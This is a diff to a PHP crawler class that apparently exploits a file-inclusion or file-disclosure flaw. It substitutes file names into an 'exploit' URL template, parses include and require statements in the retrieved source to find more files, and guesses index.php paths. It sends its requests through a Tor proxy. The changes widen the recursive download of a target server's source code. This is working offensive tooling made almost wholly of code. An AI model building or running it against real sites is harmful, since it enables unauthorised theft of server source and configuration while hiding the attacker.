@@ -31,7 +31,7 @@ class CrawlerStaticFil
     public function __construct($commandData,$url)
     {
 
-        echo $url."\n";
+        //echo $url."\n";
         $this->commandData = array_merge($this->defaultEnterData(), $commandData);
         $this->url =$url;
         $this->file =$this->readFile($url);
@@ -64,8 +64,11 @@ class CrawlerStaticFil
     }
 
     protected function downloadAllFilesByInclude(){
+
         $urlFiles=$this->getIncludes($this->file);
         $urlFiles=array_merge($this->getLinks($this->file),$urlFiles);
+        $urlFiles=array_merge($this->findIndexs($this->url),$urlFiles);
+
         $allUrlFiles=$urlFiles;
         $loop=true;
 
@@ -96,18 +99,42 @@ class CrawlerStaticFil
         return $allUrlFiles;
     }
 
+    protected function findIndexs($url){
+
+        $arrUrl=parse_url($url);
+        $arrUrl["query"]=str_replace("//","/",$arrUrl["query"]);
+        $explodeQuery=explode("/",$arrUrl["query"]);
+        $query=array();
+        if(isset($explodeQuery[1])){
+            $patch="";
+            foreach($explodeQuery as $parseQuery){
+                $patch.=$parseQuery."/";
+                $query[]=$arrUrl["scheme"]."://".$arrUrl["host"].$arrUrl["path"]."?".$patch."index.php";
+            }
+            array_pop($query);
+        }
+        //var_dump($query);
+        return $query;
+    }
+
     protected function getMoreLinksByBody($body,$urlFile){
 
         $cacheUrlFiles=array();
         $cacheUrlFiles1=$this->getIncludes($body,$urlFile);
         $cacheUrlFiles2=$this->getLinks($body);
+        $cacheUrlFiles3=$this->findIndexs($urlFile);
+
         if(!empty($cacheUrlFiles1)){
             $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles1);
         }
         if(!empty($cacheUrlFiles2)){
             $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles2);
         }
+        if(!empty($cacheUrlFiles3)){
+            $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles3);
+        }
 
+        var_dump($cacheUrlFiles);
         return $cacheUrlFiles;
 
     }
@@ -134,26 +161,35 @@ class CrawlerStaticFil
     }
 
     private function generateUrl($file,$patchFileNow=false){
-        //echo $file."**";
         return str_replace("######",$file,$this->getBaseExploit($patchFileNow));
+    }
+
+    private function generateUrlAbsolute($file){
+        return str_replace("######",$file,$this->getBaseExploit());
     }
 
     public function getIncludes($file,$patchFileNow=false){
 
         $resultFinal=array();
-        $isValid = preg_match_all("/(include|require|require_once|include_once)(.+|)\((.+|)(\"|\')(.+?)(\"|\')\)/i", $file, $m);
+        $isValid = preg_match_all("/(include|require|require_once|include_once)(.+|)\((.+|)(\"|\')(.+?)(\"|\')(.+|)\)/i", $file, $m);
 
+        //$this->urlBaseExploit
         if ($isValid) {
             $results=$this->sanitazePregMatchAll($m);
-            if($patchFileNow){
-                foreach($results as $result){
-                    $resultFinal[]=$this->generateUrl($result,$patchFileNow);
-                }
-            }else{
-                foreach($results as $result){
-                    $resultFinal[]=$this->generateUrl($result);
-                }
-
+            //var_dump($results);
+//            if($patchFileNow){
+//                foreach($results as $result){
+//                    $resultFinal[]=$this->generateUrl($result,$patchFileNow);
+//                }
+//            }else{
+//                foreach($results as $result){
+//                    $resultFinal[]=$this->generateUrl($result);
+//                }
+//
+//            }
+            foreach($results as $result){
+                $resultFinal[]=$this->generateUrl($result,$patchFileNow);
+                $resultFinal[]=$this->generateUrlAbsolute($result,$patchFileNow);
             }
 
             return $resultFinal;
@@ -196,7 +232,7 @@ class CrawlerStaticFil
             'headers' => ['User-Agent' => $header->getUserAgent()],
             'proxy' => $this->commandData['tor'],
             'timeout' => 30,
-            ],
+        ],
         ]);
         try {
             $resultBody = $client->get($url)->getBody()->getContents();
@@ -214,10 +250,21 @@ class CrawlerStaticFil
         foreach($matchs as $match){
             foreach($match as $keyValueMatch=>$valueMatch){
                 if(!empty($valueMatch) AND $valueMatch!="'" AND $valueMatch!='"'){
+
+                    //$this->urlBaseExploit
+                    //echo $valueMatch."**\n";
                     $result[1][$keyValueMatch]=$valueMatch;
+//                    if (strpos($valueMatch, $this->url) !== false) {
+//
+//                    }else{
+//                        echo str_replace("######",$valueMatch,$this->urlBaseExploit) ;
+//                        exit();
+//                    }
+
                 }
             }
         }
+        //var_dump($result);
         return $result[1];
     }
 
@@ -269,7 +316,8 @@ class CrawlerStaticFil
         return false;
     }
 
-    protected function getLinks($body){
+    protected function getLinks($body)
+    {
 
         $crawler = new Crawler($body);
         $urls=array();
